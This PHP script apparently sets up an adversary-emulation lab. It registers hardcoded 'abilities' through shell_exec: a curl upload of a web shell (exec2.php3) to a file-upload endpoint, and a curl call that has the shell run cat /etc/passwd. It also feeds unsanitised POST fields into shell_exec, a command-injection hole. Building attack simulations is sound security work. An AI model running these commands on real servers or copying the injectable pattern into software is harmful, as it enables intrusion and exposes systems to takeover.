<?php
// custom - info of ability and adversary required
// $abilities = $_POST["abilities"];

// $ability_ids = "";

// // make ability_ids
// foreach ($abilities as $abi) {
//     $res_ability = shell_exec("python3 create_ability.py ".$abi["name"]." ".$abi["desc"]." \"".$abi["code"]."\"");
//     echo "created ability".$res_ability."\n";
    
//     $ability_ids .= $res_ability." ";
// }

$built_in_codes=[
    "curl -i -s -L -F \"file=@/home/pdxf/ptemp/exec2.php3\" -F \"MAX_FILE_SIZE=10\" http://pdxf.malhyuk.info:4242/FileUpload/index.php",
    "curl -s -X GET http://pdxf.malhyuk.info:4242/FileUpload/uploads/exec2.php3?cmd=cat%20/etc/passwd"
];

foreach ($built_in_codes as $b) {
    $res_ability = shell_exec("python3 create_ability.py name test \"".$b."\"");
    echo "created ability ".$res_ability."\n";
    
    $ability_ids .= $res_ability." ";
}

// make adversary custom
// $res_adversary = shell_exec("python3 create_adversary.py ".$_POST["name"]." ".$_POST["desc"]." ".$ability_ids);
// echo "created adversary ".$res_adversary."\n";

$res_adversary = shell_exec("python3 create_adversary.py ".$_POST["Attack2_Select"]." ".$_POST["Attack3_Select"]." ".$ability_ids);
echo "created adversary ".$res_adversary."\n";

//create dockerfile and docker image
//upload challenges db
?>

